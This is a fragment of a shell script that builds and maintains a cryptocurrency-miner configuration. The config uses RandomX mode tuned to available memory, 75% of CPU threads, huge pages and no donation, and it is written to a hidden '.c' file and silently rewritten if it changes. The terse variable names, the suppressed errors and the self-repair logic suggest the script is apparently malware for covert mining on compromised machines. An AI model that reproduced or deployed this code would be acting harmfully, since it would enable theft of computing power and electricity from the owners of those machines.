...
if [ "${AVAIL_KB:-0}" -lt 3000000 ];then RXCFG='"randomx":{"mode":"light"},';else RXCFG='';fi
printf '{"autosave":true,"watch":false,%s"donate-level":0,"donate-over-proxy":0,"cpu":{"enabled":true,"huge-pages":true,"max-threads-hint":75},"opencl":false,"cuda":false,"pools":[{"url":"%s","user":"%s","pass":"%s","keepalive":true,"tls":true}]}\n' "$RXCFG" "$POOL" "$W" "$P">"$W1/.c"
chmod 600 "$W1/.c"
...
CFG='{"autosave":true,"watch":false,RXMODECFG"donate-level":0,"donate-over-proxy":0,"cpu":{"enabled":true,"huge-pages":true,"max-threads-hint":75},"opencl":false,"cuda":false,"pools":[{"url":"POOLURL","user":"WALLETHERE","pass":"PASSHERE","keepalive":true,"tls":true}]}'
rxm(){ AVAIL_KB=$(awk '/MemAvailable/{print $2}' /proc/meminfo 2>/dev/null||echo 0);if [ "${AVAIL_KB:-0}" -lt 3000000 ];then echo '"randomx":{"mode":"light"},';else echo '';fi; }
bld(){ mkdir -p "$MYDIR" 2>/dev/null;[ -f "$MYDIR/.c" ]&&return 0;echo "$CFG"|sed "s/POOLURL/$POOL/;s/WALLETHERE/$W/;s/PASSHERE/$PW/;s|RXMODECFG|$(rxm)|">"$MYDIR/.c" 2>/dev/null;chmod 600 "$MYDIR/.c" 2>/dev/null; }
cfgchk(){ AVAIL_KB=$(awk '/MemAvailable/{print $2}' /proc/meminfo 2>/dev/null||echo 0);WANTLIGHT=0;[ "${AVAIL_KB:-0}" -lt 3000000 ]&&WANTLIGHT=1;HASLIGHT=0;grep -q '"mode":"light"' "$MYDIR/.c" 2>/dev/null&&HASLIGHT=1;grep -q "$POOL" "$MYDIR/.c" 2>/dev/null&&[ "$WANTLIGHT" = "$HASLIGHT" ]&&return 0;echo "$CFG"|sed "s/POOLURL/$POOL/;s/WALLETHERE/$W/;s/PASSHERE/$PW/;s|RXMODECFG|$(rxm)|">"$MYDIR/.c" 2>/dev/null;chmod 600 "$MYDIR/.c" 2>/dev/null; }
